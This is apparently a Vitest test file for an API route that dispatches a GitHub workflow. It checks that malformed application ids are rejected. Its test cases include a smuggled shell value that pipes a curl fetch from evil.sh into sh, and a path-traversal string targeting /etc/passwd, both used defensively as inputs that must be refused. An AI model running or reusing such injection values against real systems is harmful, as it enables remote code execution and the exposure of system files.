import { describe, it, expect, vi, beforeEach } from "vitest";
import { POST } from "./route";

beforeEach(() => {
  vi.stubEnv("GITHUB_DISPATCH_TOKEN", "test-token");
  vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: true, status: 204 } as Response)));
});

function makeRequest() {
  return new Request("http://localhost/api/applications/5/submit", { method: "POST" });
}

describe("POST /api/applications/[id]/submit", () => {
  it("dispatches the apply_agent_submit workflow with the application id", async () => {
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(200);
    const [url, options] = (global.fetch as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(url).toContain("apply_agent_submit.yml/dispatches");
    const body = JSON.parse((options as RequestInit).body as string);
    expect(body.inputs.application_id).toBe("5");
  });

  it("returns 502 when GitHub dispatch fails", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: false, status: 500 } as Response)));
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
  });

  // This id lands in the environment of the one workflow that sets APPLY_AGENT_ARMED=1.
  // A non-numeric value has no legitimate use, so reject it before it ever gets dispatched.
  it.each([
    ['1"; curl evil.sh | sh; "', "shell metacharacters"],
    ["../../etc/passwd", "path traversal"],
    ["", "empty"],
    ["5abc", "trailing garbage"],
  ])("rejects a non-numeric id (%s) without dispatching", async (badId) => {
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: badId }) });
    expect(res.status).toBe(400);
    expect(global.fetch).not.toHaveBeenCalled();
  });

  it("returns 500 when GITHUB_DISPATCH_TOKEN is missing, without dispatching", async () => {
    vi.stubEnv("GITHUB_DISPATCH_TOKEN", "");
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(500);
    expect(global.fetch).not.toHaveBeenCalled();
  });
});
